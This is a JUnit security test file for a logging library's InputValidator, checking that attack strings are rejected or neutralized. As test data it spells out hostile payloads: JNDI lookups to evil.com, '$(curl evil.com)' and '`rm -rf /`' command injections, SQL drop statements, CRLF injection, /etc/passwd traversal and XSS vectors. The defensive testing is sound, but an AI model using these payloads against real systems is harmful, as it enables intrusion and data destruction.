package com.zerionis.log.core.util;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Security-focused tests for InputValidator.
 *
 * Simulates attack payloads that could appear in HTTP headers, query params,
 * or request bodies. Each test verifies that malicious input is neutralized
 * before reaching the logging pipeline.
 */
class InputValidatorSecurityTest {

    // ── Trace ID injection ──

    @Nested
    @DisplayName("Trace ID validation")
    class TraceIdTests {

        @Test
        @DisplayName("rejects JNDI lookup payload (Log4Shell style)")
        void rejectsJndiPayload() {
            assertNull(InputValidator.validateTraceId("${jndi:ldap://evil.com/a}"));
        }

        @Test
        @DisplayName("rejects script injection in trace ID")
        void rejectsScriptInjection() {
            assertNull(InputValidator.validateTraceId("<script>alert(1)</script>"));
        }

        @Test
        @DisplayName("rejects SQL injection in trace ID")
        void rejectsSqlInjection() {
            assertNull(InputValidator.validateTraceId("'; DROP TABLE logs; --"));
        }

        @Test
        @DisplayName("rejects command injection in trace ID")
        void rejectsCommandInjection() {
            assertNull(InputValidator.validateTraceId("$(curl evil.com)"));
            assertNull(InputValidator.validateTraceId("`rm -rf /`"));
        }

        @Test
        @DisplayName("rejects CRLF injection in trace ID")
        void rejectsCrlfInjection() {
            assertNull(InputValidator.validateTraceId("legit-id\r\nX-Injected: true"));
        }

        @Test
        @DisplayName("rejects unicode/homograph attacks in trace ID")
        void rejectsUnicodeAttack() {
            // Cyrillic 'а' looks like Latin 'a' but is a different codepoint
            assertNull(InputValidator.validateTraceId("tr\u0430ceId-123"));
        }

        @Test
        @DisplayName("rejects oversized trace ID (buffer overflow attempt)")
        void rejectsOversizedId() {
            String huge = "a".repeat(10_000);
            assertNull(InputValidator.validateTraceId(huge));
        }

        @Test
        @DisplayName("rejects null bytes in trace ID")
        void rejectsNullBytes() {
            assertNull(InputValidator.validateTraceId("trace\0id"));
        }

        @Test
        @DisplayName("accepts valid UUID trace ID")
        void acceptsValidUuid() {
            assertEquals("550e8400-e29b-41d4-a716-446655440000",
                    InputValidator.validateTraceId("550e8400-e29b-41d4-a716-446655440000"));
        }

        @Test
        @DisplayName("accepts valid W3C trace ID")
        void acceptsW3cTraceId() {
            assertEquals("4bf92f3577b34da6a3ce929d0e0e4736",
                    InputValidator.validateTraceId("4bf92f3577b34da6a3ce929d0e0e4736"));
        }
    }

    // ── Client IP spoofing ──

    @Nested
    @DisplayName("Client IP validation")
    class ClientIpTests {

        @ParameterizedTest
        @ValueSource(strings = {
                "<script>alert(1)</script>",
                "'; DROP TABLE logs;--",
                "${jndi:ldap://evil.com}",
                "127.0.0.1, $(curl evil.com)",
                "0x7f000001",
                "2130706433",
                "../../../etc/passwd",
                "127.0.0.1\r\nX-Injected: true"
        })
        @DisplayName("rejects malicious IP payloads")
        void rejectsMaliciousIps(String payload) {
            assertEquals("unknown", InputValidator.validateClientIp(payload));
        }

        @Test
        @DisplayName("accepts valid IPv4")
        void acceptsIpv4() {
            assertEquals("192.168.1.1", InputValidator.validateClientIp("192.168.1.1"));
        }

        @Test
        @DisplayName("accepts valid IPv6")
        void acceptsIpv6() {
            assertEquals("::1", InputValidator.validateClientIp("::1"));
        }

        @Test
        @DisplayName("rejects oversized IP string")
        void rejectsOversizedIp() {
            assertEquals("unknown", InputValidator.validateClientIp("1".repeat(1000)));
        }
    }

    // ── Path traversal / inflation ──

    @Nested
    @DisplayName("Path truncation")
    class PathTests {

        @Test
        @DisplayName("truncates path traversal payload")
        void truncatesPathTraversal() {
            String traversal = "../".repeat(2000) + "etc/passwd";
            String result = InputValidator.truncatePath(traversal);
            assertTrue(result.length() <= 2048 + 15); // +15 for "[truncated]"
            assertTrue(result.endsWith("...[truncated]"));
        }

        @Test
        @DisplayName("truncates oversized URL-encoded path")
        void truncatesUrlEncodedPath() {
            String encoded = "%2e%2e%2f".repeat(1000);
            String result = InputValidator.truncatePath(encoded);
            assertTrue(result.length() <= 2048 + 15);
        }
    }

    // ── Log message inflation ──

    @Nested
    @DisplayName("Message truncation")
    class MessageTests {

        @Test
        @DisplayName("truncates zip-bomb style repeated message")
        void truncatesRepeatedMessage() {
            String bomb = "A".repeat(1_000_000);
            String result = InputValidator.truncateMessage(bomb);
            assertTrue(result.length() <= 10_000 + 15);
        }

        @Test
        @DisplayName("truncates message with embedded JNDI payloads")
        void truncatesJndiInMessage() {
            String payload = "${jndi:ldap://evil.com/a}".repeat(10_000);
            String result = InputValidator.truncateMessage(payload);
            assertTrue(result.length() <= 10_000 + 15);
        }
    }

    // ── Extra field injection ──

    @Nested
    @DisplayName("Extra field key validation")
    class ExtraKeyTests {

        @Test
        @DisplayName("rejects key with newline (log injection)")
        void rejectsNewlineKey() {
            assertNull(InputValidator.validateExtraKey("field\ninjected: true"));
        }

        @Test
        @DisplayName("rejects key with carriage return")
        void rejectsCrKey() {
            assertNull(InputValidator.validateExtraKey("field\rinjected"));
        }

        @Test
        @DisplayName("rejects key with null byte")
        void rejectsNullByteKey() {
            assertNull(InputValidator.validateExtraKey("field\0name"));
        }

        @Test
        @DisplayName("truncates oversized key")
        void truncatesOversizedKey() {
            String longKey = "k".repeat(500);
            String result = InputValidator.validateExtraKey(longKey);
            assertNotNull(result);
            assertEquals(128, result.length());
        }

        @Test
        @DisplayName("accepts normal key")
        void acceptsNormalKey() {
            assertEquals("orderId", InputValidator.validateExtraKey("orderId"));
        }
    }

    // ── Extra field value truncation ──

    @Nested
    @DisplayName("Extra field value truncation")
    class ExtraValueTests {

        @Test
        @DisplayName("truncates string value exceeding limit")
        void truncatesLongValue() {
            String longValue = "x".repeat(100_000);
            Object result = InputValidator.truncateExtraValue(longValue);
            assertTrue(result instanceof String);
            assertTrue(((String) result).length() <= 4096 + 15);
        }

        @Test
        @DisplayName("passes through non-string values unchanged")
        void passesNonStringValues() {
            assertEquals(42, InputValidator.truncateExtraValue(42));
            assertEquals(true, InputValidator.truncateExtraValue(true));
        }
    }

    // ── HTML stripping (XSS prevention) ──

    @Nested
    @DisplayName("HTML stripping")
    class HtmlTests {

        @ParameterizedTest
        @ValueSource(strings = {
                "<script>alert('xss')</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<iframe src='javascript:alert(1)'></iframe>",
                "<body onload=alert(1)>",
                "<input onfocus=alert(1) autofocus>",
                "<marquee onstart=alert(1)>"
        })
        @DisplayName("strips common XSS vectors")
        void stripsXssVectors(String payload) {
            String result = InputValidator.stripHtml(payload);
            assertFalse(result.contains("<"), "Should not contain '<' after stripping: " + result);
        }

        @Test
        @DisplayName("strips nested/malformed tags")
        void stripsNestedTags() {
            String nested = "<<script>script>alert(1)<</script>/script>";
            String result = InputValidator.stripHtml(nested);
            assertFalse(result.contains("<script>"));
        }
    }

    // ── Control character stripping ──

    @Nested
    @DisplayName("Control character stripping")
    class ControlCharTests {

        @Test
        @DisplayName("removes all ASCII control chars except tab")
        void removesControlChars() {
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < 32; i++) {
                sb.append((char) i);
            }
            sb.append("safe text");
            sb.append((char) 0x7F); // DEL

            String result = InputValidator.stripControlChars(sb.toString());

            // Only tab (0x09) and "safe text" should survive
            assertFalse(result.contains("\n"));
            assertFalse(result.contains("\r"));
            assertFalse(result.contains("\0"));
            assertTrue(result.contains("\t"));
            assertTrue(result.contains("safe text"));
        }

        @Test
        @DisplayName("handles string with only control characters")
        void handlesOnlyControlChars() {
            String onlyControl = "\0\1\2\3\4\5\6\7";
            String result = InputValidator.stripControlChars(onlyControl);
            assertEquals("", result);
        }
    }

    // ── Null safety ──

    @Nested
    @DisplayName("Null safety")
    class NullSafetyTests {

        @Test
        @DisplayName("all methods handle null without NPE")
        void allMethodsHandleNull() {
            assertNull(InputValidator.validateTraceId(null));
            assertNull(InputValidator.truncatePath(null));
            assertNull(InputValidator.truncateMessage(null));
            assertNull(InputValidator.validateExtraKey(null));
            assertNull(InputValidator.truncateExtraValue(null));
            assertEquals("unknown", InputValidator.validateClientIp(null));
            assertNull(InputValidator.stripHtml(null));
            assertNull(InputValidator.stripControlChars(null));
        }

        @Test
        @DisplayName("all methods handle empty strings")
        void allMethodsHandleEmpty() {
            assertNull(InputValidator.validateTraceId(""));
            assertEquals("", InputValidator.truncatePath(""));
            assertEquals("", InputValidator.truncateMessage(""));
            assertNull(InputValidator.validateExtraKey(""));
            assertEquals("unknown", InputValidator.validateClientIp(""));
            assertEquals("", InputValidator.stripHtml(""));
            assertEquals("", InputValidator.stripControlChars(""));
        }
    }
}
